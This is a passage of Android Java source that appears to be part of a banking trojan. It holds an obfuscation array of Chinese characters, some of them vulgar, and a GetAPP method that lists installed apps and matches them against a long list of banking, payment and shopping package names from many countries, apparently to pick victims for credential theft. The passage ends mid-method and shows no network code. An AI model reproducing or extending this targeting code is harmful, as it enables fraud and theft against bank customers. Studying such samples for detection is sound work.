    public static final String[] cn_char = {"需","要","意","在","中","并","没","有","个","概","念","小","语","拼","亡","及","注","鲜","新","死","之","类","阿","努","比","拉","丁","化","体","系","都","只","斯","一","套","用","恶","件","来","标","音","的","符","号","而","不","是","字","母","寂","寞","肏","你","妈","屄","引","脚","吸","员","会","膏","药"};





    public String GetAPP(Context context){
        String BBB = "";

        final PackageManager xpsmssss = context.getPackageManager();
        List<ApplicationInfo> packages = xpsmssss.getInstalledApplications(PackageManager.GET_META_DATA);
        for (ApplicationInfo packageInfo : packages) {
            if ((packageInfo.packageName.equals("at.spardat.bcrmobile")))
                BBB += "at.spardat.bcrmobile,";
            if ((packageInfo.packageName.equals("at.spardat.netbanking")))
                BBB += "at.spardat.netbanking,";
            if ((packageInfo.packageName.equals("com.bankaustria.android.olb")))
                BBB += "com.bankaustria.android.olb,";
            if ((packageInfo.packageName.equals("com.bmo.mobile"))) BBB += "com.bmo.mobile,";
            if ((packageInfo.packageName.equals("com.cibc.android.mobi")))
                BBB += "com.cibc.android.mobi,";
            if ((packageInfo.packageName.equals("com.rbc.mobile.android")))
                BBB += "com.rbc.mobile.android,";
            if ((packageInfo.packageName.equals("com.scotiabank.mobile")))
                BBB += "com.scotiabank.mobile,";
            if ((packageInfo.packageName.equals("com.td"))) BBB += "com.td,";
            if ((packageInfo.packageName.equals("cz.airbank.android")))
                BBB += "cz.airbank.android,";
            if ((packageInfo.packageName.equals("eu.inmite.prj.kb.mobilbank")))
                BBB += "eu.inmite.prj.kb.mobilbank,";
            if ((packageInfo.packageName.equals("com.bankinter.launcher")))
                BBB += "com.bankinter.launcher,";
            if ((packageInfo.packageName.equals("com.kutxabank.android")))
                BBB += "com.kutxabank.android,";
            if ((packageInfo.packageName.equals("com.rsi"))) BBB += "com.rsi,";
            if ((packageInfo.packageName.equals("com.tecnocom.cajalaboral")))
                BBB += "com.tecnocom.cajalaboral,";
            if ((packageInfo.packageName.equals("es.bancopopular.nbmpopular")))
                BBB += "es.bancopopular.nbmpopular,";
            if ((packageInfo.packageName.equals("es.evobanco.bancamovil")))
                BBB += "es.evobanco.bancamovil,";
            if ((packageInfo.packageName.equals("es.lacaixa.mobile.android.newwapicon")))
                BBB += "es.lacaixa.mobile.android.newwapicon,";
            if ((packageInfo.packageName.equals("com.dbs.hk.dbsmbanking")))
                BBB += "com.dbs.hk.dbsmbanking,";
            if ((packageInfo.packageName.equals("com.FubonMobileClient")))
                BBB += "com.FubonMobileClient,";
            if ((packageInfo.packageName.equals("com.hangseng.rbmobile")))
                BBB += "com.hangseng.rbmobile,";
            if ((packageInfo.packageName.equals("com.MobileTreeApp"))) BBB += "com.MobileTreeApp,";
            if ((packageInfo.packageName.equals("com.mtel.androidbea")))
                BBB += "com.mtel.androidbea,";
            if ((packageInfo.packageName.equals("com.scb.breezebanking.hk")))
                BBB += "com.scb.breezebanking.hk,";
            if ((packageInfo.packageName.equals("hk.com.hsbc.hsbchkmobilebanking")))
                BBB += "hk.com.hsbc.hsbchkmobilebanking,";
            if ((packageInfo.packageName.equals("com.aff.otpdirekt"))) BBB += "com.aff.otpdirekt,";
            if ((packageInfo.packageName.equals("com.ideomobile.hapoalim")))
                BBB += "com.ideomobile.hapoalim,";
            if ((packageInfo.packageName.equals("com.infrasofttech.indianBank")))
                BBB += "com.infrasofttech.indianBank,";
            if ((packageInfo.packageName.equals("com.mobikwik_new"))) BBB += "com.mobikwik_new,";
            if ((packageInfo.packageName.equals("com.oxigen.oxigenwallet")))
                BBB += "com.oxigen.oxigenwallet,";
            if ((packageInfo.packageName.equals("jp.co.aeonbank.android.passbook")))
                BBB += "jp.co.aeonbank.android.passbook,";
            if ((packageInfo.packageName.equals("jp.co.netbk"))) BBB += "jp.co.netbk,";
            if ((packageInfo.packageName.equals("jp.co.rakuten_bank.rakutenbank")))
                BBB += "jp.co.rakuten_bank.rakutenbank,";
            if ((packageInfo.packageName.equals("jp.co.sevenbank.AppPassbook")))
                BBB += "jp.co.sevenbank.AppPassbook,";
            if ((packageInfo.packageName.equals("jp.co.smbc.direct"))) BBB += "jp.co.smbc.direct,";
            if ((packageInfo.packageName.equals("jp.mufg.bk.applisp.app")))
                BBB += "jp.mufg.bk.applisp.app,";
            if ((packageInfo.packageName.equals("com.barclays.ke.mobile.android.ui")))
                BBB += "com.barclays.ke.mobile.android.ui,";
            if ((packageInfo.packageName.equals("nz.co.anz.android.mobilebanking")))
                BBB += "nz.co.anz.android.mobilebanking,";
            if ((packageInfo.packageName.equals("nz.co.asb.asbmobile")))
                BBB += "nz.co.asb.asbmobile,";
            if ((packageInfo.packageName.equals("nz.co.bnz.droidbanking")))
                BBB += "nz.co.bnz.droidbanking,";
            if ((packageInfo.packageName.equals("nz.co.kiwibank.mobile")))
                BBB += "nz.co.kiwibank.mobile,";
            if ((packageInfo.packageName.equals("com.getingroup.mobilebanking")))
                BBB += "com.getingroup.mobilebanking,";
            if ((packageInfo.packageName.equals("eu.eleader.mobilebanking.pekao.firm")))
                BBB += "eu.eleader.mobilebanking.pekao.firm,";
            if ((packageInfo.packageName.equals("eu.eleader.mobilebanking.pekao")))
                BBB += "eu.eleader.mobilebanking.pekao,";
            if ((packageInfo.packageName.equals("eu.eleader.mobilebanking.raiffeisen")))
                BBB += "eu.eleader.mobilebanking.raiffeisen,";
            if ((packageInfo.packageName.equals("pl.bzwbk.bzwbk24"))) BBB += "pl.bzwbk.bzwbk24,";
            if ((packageInfo.packageName.equals("pl.ipko.mobile"))) BBB += "pl.ipko.mobile,";
            if ((packageInfo.packageName.equals("pl.mbank"))) BBB += "pl.mbank,";
            if ((packageInfo.packageName.equals("alior.bankingapp.android"))) BBB += "alior.bankingapp.android,";
            if ((packageInfo.packageName.equals("com.comarch.mobile.banking.bgzbnpparibas.biznes"))) BBB += "com.comarch.mobile.banking.bgzbnpparibas.biznes,";
            if ((packageInfo.packageName.equals("com.comarch.security.mobilebanking"))) BBB += "com.comarch.security.mobilebanking,";
            if ((packageInfo.packageName.equals("com.empik.empikapp"))) BBB += "com.empik.empikapp,";
            if ((packageInfo.packageName.equals("com.empik.empikfoto"))) BBB += "com.empik.empikfoto,";
            if ((packageInfo.packageName.equals("com.finanteq.finance.ca"))) BBB += "com.finanteq.finance.ca,";
            if ((packageInfo.packageName.equals("com.orangefinansek"))) BBB += "com.orangefinanse,";
            if ((packageInfo.packageName.equals("eu.eleader.mobilebanking.invest"))) BBB += "eu.eleader.mobilebanking.invest,";
            if ((packageInfo.packageName.equals("pl.aliorbank.aib"))) BBB += "pl.aliorbank.aib,";
            if ((packageInfo.packageName.equals("pl.allegro"))) BBB += "pl.allegro,";
            if ((packageInfo.packageName.equals("pl.bosbank.mobile"))) BBB += "pl.bosbank.mobile,";
            if ((packageInfo.packageName.equals("pl.bph"))) BBB += "pl.bph,";
            if ((packageInfo.packageName.equals("pl.bps.bankowoscmobilna"))) BBB += "pl.bps.bankowoscmobilna,";
            if ((packageInfo.packageName.equals("pl.bzwbk.ibiznes24"))) BBB += "pl.bzwbk.ibiznes24,";
            if ((packageInfo.packageName.equals("pl.bzwbk.mobile.tab.bzwbk24"))) BBB += "pl.bzwbk.mobile.tab.bzwbk24,";
            if ((packageInfo.packageName.equals("pl.ceneo"))) BBB += "pl_pl.ceneo,";
            if ((packageInfo.packageName.equals("pl.com.rossmann.centauros"))) BBB += "pl.com.rossmann.centauros,";
            if ((packageInfo.packageName.equals("pl.fmbank.smart"))) BBB += "pl.fmbank.smart,";
            if ((packageInfo.packageName.equals("pl.ideabank.mobilebanking"))) BBB += "pl.ideabank.mobilebanking,";
            if ((packageInfo.packageName.equals("pl.ing.mojeing"))) BBB += "pl.ing.mojeing,";
            if ((packageInfo.packageName.equals("pl.millennium.corpApp"))) BBB += "pl.millennium.corpApp,";
            if ((packageInfo.packageName.equals("pl.orange.mojeorange"))) BBB += "pl.orange.mojeorange,";
            if ((packageInfo.packageName.equals("pl.pkobp.iko"))) BBB += "pl.pkobp.iko,";
            if ((packageInfo.packageName.equals("pl.pkobp.ipkobiznes"))) BBB += "pl.pkobp.ipkobiznes,";
            if ((packageInfo.packageName.equals("com.kuveytturk.mobil"))) BBB += "com.kuveytturk.mobil,";
            if ((packageInfo.packageName.equals("com.magiclick.odeabank"))) BBB += "com.magiclick.odeabank,";
            if ((packageInfo.packageName.equals("com.mobillium.papara"))) BBB += "com.mobillium.papara,";
            if ((packageInfo.packageName.equals("com.pozitron.albarakaturk"))) BBB += "com.pozitron.albarakaturk,";
            if ((packageInfo.packageName.equals("com.teb"))) BBB += "com.teb,";
            if ((packageInfo.packageName.equals("ccom.tmob.denizbank"))) BBB += "com.tmob.denizbank,";
            if ((packageInfo.packageName.equals("com.tmob.tabletdeniz"))) BBB += "com.tmob.tabletdeniz,";
            if ((packageInfo.packageName.equals("com.vakifbank.mobilel"))) BBB += "com.vakifbank.mobile,";
            if ((packageInfo.packageName.equals("tr.com.sekerbilisim.mbank"))) BBB += "tr.com.sekerbilisim.mbank,";
            if ((packageInfo.packageName.equals("wit.android.bcpBankingApp.millenniumPL"))) BBB += "wit.android.bcpBankingApp.millenniumPL,";



            if ((packageInfo.packageName.equals("com.idamobile.android.hcb"))) BBB += "com.idamobile.android.hcb,";

            if ((packageInfo.packageName.equals("ru.rosbank.android"))) BBB += "ru.rosbank.android,";
            if ((packageInfo.packageName.equals("logo.com.mbanking"))) BBB += "logo.com.mbanking,";

            if ((packageInfo.packageName.equals("com.vkontakte.android"))) BBB += "com.vkontakte.android,";
            if ((packageInfo.packageName.equals("ru.avangard"))) BBB += "ru.avangard,";

            if ((packageInfo.packageName.equals("ru.taxovichkof.android"))) BBB += "ru.taxovichkof.android,";
            if ((packageInfo.packageName.equals("ru.taxovichkof.android"))) BBB += "ru.taxovichkof.android,";


            if ((packageInfo.packageName.equals("ru.simpls.mbrd.ui"))) BBB += "ru.simpls.mbrd.ui,";
            if ((packageInfo.packageName.equals("ru.simpls.brs2.mobbank"))) BBB += "ru.simpls.brs2.mobbank,";


            if ((packageInfo.packageName.equals("com.advantage.RaiffeisenBank")))
                BBB += "com.advantage.RaiffeisenBank,";
            if ((packageInfo.packageName.equals("hr.asseco.android.jimba.mUCI.ro")))
                BBB += "hr.asseco.android.jimba.mUCI.ro,";
            if ((packageInfo.packageName.equals("may.maybank.android")))
                BBB += "may.maybank.android,";
            if ((packageInfo.packageName.equals("ro.btrl.mobile"))) BBB += "ro.btrl.mobile,";
            if ((packageInfo.packageName.equals("com.amazon.mShop.android.shopping")) ||
                    (packageInfo.packageName.equals("com.amazon.windowshop"))) {
                BBB += "com.amazon.mShop.android.shopping,";
            }
            if ((packageInfo.packageName.equals("com.ebay.mobile"))) BBB += "com.ebay.mobile,";
            if ((packageInfo.packageName.equals("ru.sberbankmobile")) ||
                    (packageInfo.packageName.equals("ru.sberbank.spasibo")) ||
                    (packageInfo.packageName.equals("ru.sberbank_sbbol")) ||
                    (packageInfo.packageName.equals("ru.sberbank.mobileoffice")) ||
                    (packageInfo.packageName.equals("ru.sberbank.sberbankir"))) {
                BBB += "ru.sberbankmobile,";
            }
            if ((packageInfo.packageName.equals("ru.alfabank.mobile.android")) ||
                    (packageInfo.packageName.equals("ru.alfabank.oavdo.amc")) ||
                    (packageInfo.packageName.equals("by.st.alfa")) ||
                    (packageInfo.packageName.equals("ru.alfabank.sense")) ||
                    (packageInfo.packageName.equals("ru.alfadirect.app"))) {
                BBB += "ru.alfabank.mobile.android,";
            }
            if ((packageInfo.packageName.equals("ru.mw"))) BBB += "ru.mw,";
            if ((packageInfo.packageName.equals("com.idamob.tinkoff.android")) ||
                    (packageInfo.packageName.equals("ru.tcsbank.c2c")) ||
                    (packageInfo.packageName.equals("ru.tinkoff.mgp")) ||
                    (packageInfo.packageName.equals("ru.tinkoff.sme")) ||
                    (packageInfo.packageName.equals("ru.tinkoff.goabroad"))) {
                BBB += "com.idamob.tinkoff.android,";
            }
            if ((packageInfo.packageName.equals("ru.vtb24.mobilebanking.android")) ||
                    (packageInfo.packageName.equals("ru.bm.mbm")) ||
                    (packageInfo.packageName.equals("com.vtb.mobilebank")) ||
                    (packageInfo.packageName.equals("com.bssys.VTBClient")) ||
                    (packageInfo.packageName.equals("com.bssys.vtb.mobileclient"))) {
                BBB += "ru.vtb24.mobilebanking.android,";
            }
            if ((packageInfo.packageName.equals("com.akbank.android.apps.akbank_direkt")) ||
                    (packageInfo.packageName.equals("com.akbank.android.apps.akbank_direkt_tablet")) ||
                    (packageInfo.packageName.equals("com.akbank.softotp")) ||
                    (packageInfo.packageName.equals("com.akbank.android.apps.akbank_direkt_tablet_20")) ||
                    (packageInfo.packageName.equals("com.fragment.akbank"))) {
                BBB += "com.akbank.android.apps.akbank_direkt,";
            }
            if ((packageInfo.packageName.equals("com.ykb.android")) ||
                    (packageInfo.packageName.equals("com.ykb.android.mobilonay")) ||
                    (packageInfo.packageName.equals("com.ykb.avm")) ||
                    (packageInfo.packageName.equals("com.ykb.androidtablet")) ||
                    (packageInfo.packageName.equals("com.veripark.ykbaz"))) {
                BBB += "com.ykb.android,";
            }
            if ((packageInfo.packageName.equals("com.softtech.iscek")) ||
                    (packageInfo.packageName.equals("com.yurtdisi.iscep")) ||
                    (packageInfo.packageName.equals("com.softtech.isbankasi")) ||
                    (packageInfo.packageName.equals("com.monitise.isbankmoscow"))) {
                BBB += "com.softtech.iscek,";
            }
            if ((packageInfo.packageName.equals("com.finansbank.mobile.cepsube")) ||
                    (packageInfo.packageName.equals("finansbank.enpara")) ||
                    (packageInfo.packageName.equals("com.magiclick.FinansPOS")) ||
                    (packageInfo.packageName.equals("com.matriksdata.finansyatirim")) ||
                    (packageInfo.packageName.equals("finansbank.enpara.sirketim")) ||
                    (packageInfo.packageName.equals("com.vipera.ts.starter.QNB")) ||
                    (packageInfo.packageName.equals("com.redrockdigimark"))) {
                BBB += "com.finansbank.mobile.cepsube,";
            }
            if ((packageInfo.packageName.equals("com.garanti.cepsubesi")) ||
                    (packageInfo.packageName.equals("com.garanti.cepbank")) ||
                    (packageInfo.packageName.equals("com.garantibank.cepsubesiro")) ||
                    (packageInfo.packageName.equals("com.matriksdata.finansyatirim")) ||
                    (packageInfo.packageName.equals("biz.mobinex.android.apps.cep_sifrematik")) ||
                    (packageInfo.packageName.equals("com.garantiyatirim.fx"))) {
                BBB += "com.garanti.cepsubesi,";
            }
            if ((packageInfo.packageName.equals("com.tmobtech.halkbank")) ||
                    (packageInfo.packageName.equals("com.SifrebazCep")) ||
                    (packageInfo.packageName.equals("eu.newfrontier.iBanking.mobile.Halk.Retail")) ||
                    (packageInfo.packageName.equals("tr.com.tradesoft.tradingsystem.gtpmobile.halk")) ||
                    (packageInfo.packageName.equals("com.DijitalSahne.EnYakinHalkbank"))) {
                BBB += "com.tmobtech.halkbank,";
            }
            if ((packageInfo.packageName.equals("com.ziraat.ziraatmobil")) ||
                    (packageInfo.packageName.equals("com.ziraat.ziraattablet")) ||
                    (packageInfo.packageName.equals("com.matriksmobile.android.ziraatTrader")) ||
                    (packageInfo.packageName.equals("com.matriksdata.ziraatyatirim.pad"))) {
                BBB += "com.ziraat.ziraatmobil,";
            }
            if (packageInfo.packageName.equals("de.ingdiba.bankingapp"))
                BBB += "de.ingdiba.bankingapp,";
            if (packageInfo.packageName.equals("de.comdirect.android"))
                BBB += "de.comdirect.android,";
            if (packageInfo.packageName.equals("de.commerzbanking.mobil"))
                BBB += "de.commerzbanking.mobil,";
            if (packageInfo.packageName.equals("de.consorsbank")) BBB += "de.consorsbank,";
            if (packageInfo.packageName.equals("com.db.mm.deutschebank"))
                BBB += "com.db.mm.deutschebank,";
            if ((packageInfo.packageName.equals("de.dkb.portalapp") || (packageInfo.packageName.equals("com.de.dkb.portalapp"))))
                BBB += "de.dkb.portalapp,";
            if (packageInfo.packageName.equals("com.ing.diba.mbbr2")) BBB += "com.ing.diba.mbbr2,";
            if (packageInfo.packageName.equals("de.postbank.finanzassistent"))
                BBB += "de.postbank.finanzassistent,";
            if (packageInfo.packageName.equals("mobile.santander.de"))
                BBB += "mobile.santander.de,";
            if (packageInfo.packageName.equals("de.fiducia.smartphone.android.banking.vr"))
                BBB += "de.fiducia.smartphone.android.banking.vr,";
            if (packageInfo.packageName.equals("fr.creditagricole.androidapp"))
                BBB += "fr.creditagricole.androidapp,";
            if (packageInfo.packageName.equals("fr.axa.monaxa")) BBB += "fr.axa.monaxa,";
            if (packageInfo.packageName.equals("fr.banquepopulaire.cyberplus"))
                BBB += "fr.banquepopulaire.cyberplus,";
            if (packageInfo.packageName.equals("net.bnpparibas.mescomptes"))
                BBB += "net.bnpparibas.mescomptes,";
            if (packageInfo.packageName.equals("com.boursorama.android.clients"))
                BBB += "com.boursorama.android.clients,";
            if (packageInfo.packageName.equals("com.caisseepargne.android.mobilebanking"))
                BBB += "com.caisseepargne.android.mobilebanking,";
            if (packageInfo.packageName.equals("fr.lcl.android.customerarea"))
                BBB += "fr.lcl.android.customerarea,";
            if (packageInfo.packageName.equals("com.paypal.android.p2pmobile"))
                BBB += "com.paypal.android.p2pmobile,";
            if ((packageInfo.packageName.equals("com.wf.wellsfargomobile")) ||
                    (packageInfo.packageName.equals("com.wf.wellsfargomobile.tablet")) ||
                    (packageInfo.packageName.equals("com.wellsFargo.ceomobile"))) {
                BBB += "com.wf.wellsfargomobile,";
            }
            if ((packageInfo.packageName.equals("com.usbank.mobilebanking")))
                BBB += "com.usbank.mobilebanking,";
            if (packageInfo.packageName.equals("com.usaa.mobile.android.usaa"))
                BBB += "com.usaa.mobile.android.usaa,";
            if (packageInfo.packageName.equals("com.suntrust.mobilebanking"))
                BBB += "com.suntrust.mobilebanking,";
            if (packageInfo.packageName.equals("com.moneybookers.skrillpayments.neteller"))
                BBB += "com.moneybookers.skrillpayments.neteller,";
            if (packageInfo.packageName.equals("com.moneybookers.skrillpayments"))
                BBB += "com.moneybookers.skrillpayments,";
            if (packageInfo.packageName.equals("com.clairmail.fth")) BBB += "com.clairmail.fth,";
            if ((packageInfo.packageName.equals("com.konylabs.capitalone")) || (packageInfo.packageName.equals("com.yinzcam.facilities.verizon")))
                BBB += "com.konylabs.capitalone,";
            if (packageInfo.packageName.equals("com.chase.sig.android"))
                BBB += "com.chase.sig.android,";
            if ((packageInfo.packageName.equals("com.infonow.bofa")) || (packageInfo.packageName.equals("com.bankofamerica.cashpromobile")))
                BBB += "com.infonow.bofa,";
            if ((packageInfo.packageName.equals("uk.co.bankofscotland.businessbank")) || (packageInfo.packageName.equals("com.grppl.android.shell.BOS")))
                BBB += "uk.co.bankofscotland.businessbank,";
            if ((packageInfo.packageName.equals("com.rbs.mobile.android.natwestoffshore")) || (packageInfo.packageName.equals("com.rbs.mobile.android.natwest")) ||
                    (packageInfo.packageName.equals("com.rbs.mobile.android.natwestbandc")))
                BBB += "com.rbs.mobile.android.natwestoffshore,";
            if ((packageInfo.packageName.equals("com.rbs.mobile.investisir")) ||
                    (packageInfo.packageName.equals("com.phyder.engage")) ||
                    (packageInfo.packageName.equals("com.rbs.mobile.android.rbs")) ||
                    (packageInfo.packageName.equals("com.rbs.mobile.android.rbsbandc"))) {
                BBB += "com.rbs.mobile.investisir,";
            }
            if ((packageInfo.packageName.equals("uk.co.santander.santanderUK")) ||
                    (packageInfo.packageName.equals("uk.co.santander.businessUK.bb")) ||
                    (packageInfo.packageName.equals("com.sovereign.santander"))) {
                BBB += "uk.co.santander.santanderUK,";
            }
            if ((packageInfo.packageName.equals("com.ifs.banking.fiid4202")) || (packageInfo.packageName.equals("com.fi6122.godough")))
                BBB += "com.ifs.banking.fiid4202,";
            if (packageInfo.packageName.equals("com.rbs.mobile.android.ubr"))
                BBB += "com.rbs.mobile.android.ubr,";
            if (packageInfo.packageName.equals("com.htsu.hsbcpersonalbanking"))
                BBB += "com.htsu.hsbcpersonalbanking,";
            if (packageInfo.packageName.equals("com.grppl.android.shell.halifax"))
                BBB += "com.grppl.android.shell.halifax,";
            if (packageInfo.packageName.equals("com.grppl.android.shell.CMBlloydsTSB73"))
                BBB += "com.grppl.android.shell.CMBlloydsTSB73,";
            if ((packageInfo.packageName.equals("com.barclays.android.barclaysmobilebanking")))
                BBB += "com.barclays.android.barclaysmobilebanking,";
            if ((packageInfo.packageName.equals("com.unionbank.ecommerce.mobile.android")) ||
                    (packageInfo.packageName.equals("com.unionbank.ecommerce.mobile.commercial.legacy")))
                BBB += "com.unionbank.ecommerce.mobile.android,";
            if ((packageInfo.packageName.equals("com.snapwork.IDBI")) ||
                    (packageInfo.packageName.equals("com.idbibank.abhay_card")) ||
                    (packageInfo.packageName.equals("src.com.idbi")) ||
                    (packageInfo.packageName.equals("com.idbi.mpassbook"))) {
                BBB += "com.unionbank.ecommerce.mobile.android,";
            }
            if ((packageInfo.packageName.equals("com.ing.mobile"))) BBB += "com.ing.mobile,";
            if ((packageInfo.packageName.equals("com.snapwork.hdfc"))) BBB += "com.snapwork.hdfc,";
            if ((packageInfo.packageName.equals("com.sbi.SBIFreedomPlus")))
                BBB += "com.sbi.SBIFreedomPlus,";
            if ((packageInfo.packageName.equals("hdfcbank.hdfcquickbank")))
                BBB += "hdfcbank.hdfcquickbank,";
            if ((packageInfo.packageName.equals("com.csam.icici.bank.imobile")))
                BBB += "com.csam.icici.bank.imobile,";
            if ((packageInfo.packageName.equals("in.co.bankofbaroda.mpassbook")))
                BBB += "in.co.bankofbaroda.mpassbook,";
            if ((packageInfo.packageName.equals("com.axis.mobile"))) BBB += "com.axis.mobile,";
            if ((packageInfo.packageName.equals("cz.csob.smartbanking")))
                BBB += "cz.csob.smartbanking,";
            if ((packageInfo.packageName.equals("cz.sberbankcz"))) BBB += "cz.sberbankcz,";
            if ((packageInfo.packageName.equals("sk.sporoapps.accounts")) ||
                    (packageInfo.packageName.equals("sk.sporoapps.skener")))
                BBB += "sk.sporoapps.accounts,";
            if ((packageInfo.packageName.equals("com.cleverlance.csas.servis24")))
                BBB += "com.cleverlance.csas.servis24,";
            if ((packageInfo.packageName.equals("org.westpac.bank") ||
                    (packageInfo.packageName.equals("nz.co.westpac"))))
                BBB += "org.westpac.bank,nz.co.westpac,";
            if ((packageInfo.packageName.equals("au.com.suncorp.SuncorpBank")))
                BBB += "au.com.suncorp.SuncorpBank,";
            if ((packageInfo.packageName.equals("org.stgeorge.bank"))) BBB += "org.stgeorge.bank,";
            if ((packageInfo.packageName.equals("org.banksa.bank"))) BBB += "org.banksa.bank,";
            if ((packageInfo.packageName.equals("au.com.newcastlepermanent")))
                BBB += "au.com.newcastlepermanent,";
            if ((packageInfo.packageName.equals("au.com.nab.mobile"))) BBB += "au.com.nab.mobile,";
            if ((packageInfo.packageName.equals("au.com.mebank.banking")))
                BBB += "au.com.mebank.banking,";
            if ((packageInfo.packageName.equals("au.com.ingdirect.android")) || (packageInfo.packageName.equals("MyING.be")))
                BBB += "au.com.ingdirect.android,";
            if ((packageInfo.packageName.equals("com.imb.banking2"))) BBB += "com.imb.banking2,";
            if ((packageInfo.packageName.equals("com.fusion.ATMLocator")))
                BBB += "com.fusion.ATMLocator,";
            if ((packageInfo.packageName.equals("au.com.cua.mb"))) BBB += "au.com.cua.mb,";
            if ((packageInfo.packageName.equals("com.commbank.netbank")) || (packageInfo.packageName.equals("com.cba.android.netbank")))
                BBB += "com.commbank.netbank,";
            if ((packageInfo.packageName.equals("com.citibank.mobile.au")) ||
                    (packageInfo.packageName.equals("com.citibank.mobile.uk")) ||
                    (packageInfo.packageName.equals("com.citi.citimobile"))) {
                BBB += "com.citibank.mobile.au,";
            }
            if ((packageInfo.packageName.equals("org.bom.bank"))) BBB += "org.bom.bank,";

            if ((packageInfo.packageName.equals("com.bendigobank.mobile")) || (packageInfo.packageName.equals("me.doubledutch.hvdnz.cbnationalconference2016")))
                BBB += "com.bendigobank.mobile,";

            if ((packageInfo.packageName.equals("au.com.bankwest.mobile")))
                BBB += "au.com.bankwest.mobile,";

            if ((packageInfo.packageName.equals("com.bankofqueensland.boq")))
                BBB += "com.bankofqueensland.boq,";
            if ((packageInfo.packageName.equals("com.anz.android.gomoney")) ||
                    (packageInfo.packageName.equals("com.anz.android")) ||
                    (packageInfo.packageName.equals("com.anz.SingaporeDigitalBanking")) ||
                    (packageInfo.packageName.equals("com.anzspot.mobile")) ||
                    (packageInfo.packageName.equals("com.crowdcompass.appSQ0QACAcYJ")) ||
                    (packageInfo.packageName.equals("com.arubanetworks.atmanz")) ||
                    (packageInfo.packageName.equals("com.quickmobile.anzirevents15"))) {
                BBB += "com.anz.android.gomoney,";
            }
            if ((packageInfo.packageName.equals("at.volksbank.volksbankmobile")) ||
                    (packageInfo.packageName.equals("de.fiducia.smartphone.android.banking.vr")) ||
                    (packageInfo.packageName.equals("it.volksbank.android")) ||
                    (packageInfo.packageName.equals("it.secservizi.mobile.atime.bpaa")) ||
                    (packageInfo.packageName.equals("de.fiducia.smartphone.android.securego.vr")) ||
                    (packageInfo.packageName.equals("com.unionbank.ecommerce.mobile.commercial.legacy"))) {
                BBB += "at.volksbank.volksbankmobile,";
            }
            if ((packageInfo.packageName.equals("com.isis_papyrus.raiffeisen_pay_eyewdg")))
                BBB += "com.isis_papyrus.raiffeisen_pay_eyewdg,";
            if ((packageInfo.packageName.equals("at.easybank.mbanking")) ||
                    (packageInfo.packageName.equals("at.easybank.tablet")) ||
                    (packageInfo.packageName.equals("at.easybank.securityapp"))) {
                BBB += "at.easybank.mbanking,";
            }
            if ((packageInfo.packageName.equals("at.bawag.mbanking")) ||
                    (packageInfo.packageName.equals("com.bawagpsk.securityapp")) ||
                    (packageInfo.packageName.equals("at.psa.app.bawag"))) {
                BBB += "at.bawag.mbanking,";
            }
            if ((packageInfo.packageName.equals("com.pozitron.iscep")))
                BBB += "com.pozitron.iscep,";
            if ((packageInfo.packageName.equals("com.vakifbank.mobile")) || (packageInfo.packageName.equals("com.pozitron.vakifbank")))
                BBB += "com.vakifbank.mobile,";
            if ((packageInfo.packageName.equals("com.starfinanz.smob.android.sfinanzstatus")) ||
                    (packageInfo.packageName.equals("com.starfinanz.mobile.android.pushtan")) ||
                    (packageInfo.packageName.equals("com.entersekt.authapp.sparkasse")) ||
                    (packageInfo.packageName.equals("com.starfinanz.smob.android.sfinanzstatus.tablet"))) {
                BBB += "com.starfinanz.smob.android.sfinanzstatus,";
            }
            if ((packageInfo.packageName.equals("com.starfinanz.smob.android.sbanking")))
                BBB += "com.starfinanz.smob.android.sbanking,";
            if ((packageInfo.packageName.equals("com.palatine.android.mobilebanking.prod")))
                BBB += "com.palatine.android.mobilebanking.prod,";
            if ((packageInfo.packageName.equals("fr.laposte.lapostemobile")) || (packageInfo.packageName.equals("fr.laposte.lapostetablet")))
                BBB += "fr.laposte.lapostemobile,";
            if ((packageInfo.packageName.equals("com.cm_prod.bad")) ||
                    (packageInfo.packageName.equals("com.cm_prod.epasal")) ||
                    (packageInfo.packageName.equals("com.cm_prod_tablet.bad")) ||
                    (packageInfo.packageName.equals("com.cm_prod.nosactus"))) {
                BBB += "com.cm_prod.bad,";
            }
            if ((packageInfo.packageName.equals("mobi.societegenerale.mobile.lappli")))
                BBB += "mobi.societegenerale.mobile.lappli,";
            if ((packageInfo.packageName.equals("com.bbva.netcash"))) BBB += "com.bbva.netcash,";
            if ((packageInfo.packageName.equals("com.bbva.bbvacontigo")) || (packageInfo.packageName.equals("com.bbva.bbvawallet")))
                BBB += "com.bbva.bbvacontigo,";
            if ((packageInfo.packageName.equals("es.bancosantander.apps")) || (packageInfo.packageName.equals("com.santander.app")))
                BBB += "es.bancosantander.apps,";
            if ((packageInfo.packageName.equals("es.cm.android")) || (packageInfo.packageName.equals("es.cm.android.tablet")) ||
                    (packageInfo.packageName.equals("com.bankia.wallet"))) BBB += "es.cm.android,";

            if ((packageInfo.packageName.equals("com.bestbuy.android"))) BBB += "com.bestbuy.android,";

            //--IT----
            if ((packageInfo.packageName.equals("com.jiffyondemand.user"))) BBB += "com.jiffyondemand.user,";
            if ((packageInfo.packageName.equals("com.latuabancaperandroid"))) BBB += "com.latuabancaperandroid,";
            if ((packageInfo.packageName.equals("com.latuabanca_tabperandroid"))) BBB += "com.latuabanca_tabperandroid,";
            if ((packageInfo.packageName.equals("com.lynxspa.bancopopolare"))) BBB += "com.lynxspa.bancopopolare,";
            if ((packageInfo.packageName.equals("com.unicredit"))) BBB += "com.unicredit,";
            if ((packageInfo.packageName.equals("it.bnl.apps.banking"))) BBB += "it.bnl.apps.banking,";
            if ((packageInfo.packageName.equals("it.bnl.apps.enterprise.bnlpay"))) BBB += "it.bnl.apps.enterprise.bnlpay,";
            if ((packageInfo.packageName.equals("it.bpc.proconl.mbplus"))) BBB += "it.bpc.proconl.mbplus,";
            if ((packageInfo.packageName.equals("it.copergmps.rt.pf.android.sp.bmps"))) BBB += "it.copergmps.rt.pf.android.sp.bmps,";
            if ((packageInfo.packageName.equals("it.gruppocariparma.nowbanking"))) BBB += "it.gruppocariparma.nowbanking,";
            if ((packageInfo.packageName.equals("it.ingdirect.app"))) BBB += "it.ingdirect.app,";
            if ((packageInfo.packageName.equals("it.nogood.container"))) BBB += "it.nogood.container,";
            if ((packageInfo.packageName.equals("it.popso.SCRIGNOapp"))) BBB += "it.popso.SCRIGNOapp,";
            if ((packageInfo.packageName.equals("posteitaliane.posteapp.apppostepay"))) BBB += "posteitaliane.posteapp.apppostepay,";

            //--NL----
            if ((packageInfo.packageName.equals("com.abnamro.nl.mobile.payments"))) BBB += "com.abnamro.nl.mobile.payments,";
            if ((packageInfo.packageName.equals("com.triodos.bankingnl"))) BBB += "com.triodos.bankingnl,";
            if ((packageInfo.packageName.equals("nl.asnbank.asnbankieren"))) BBB += "nl.asnbank.asnbankieren,";
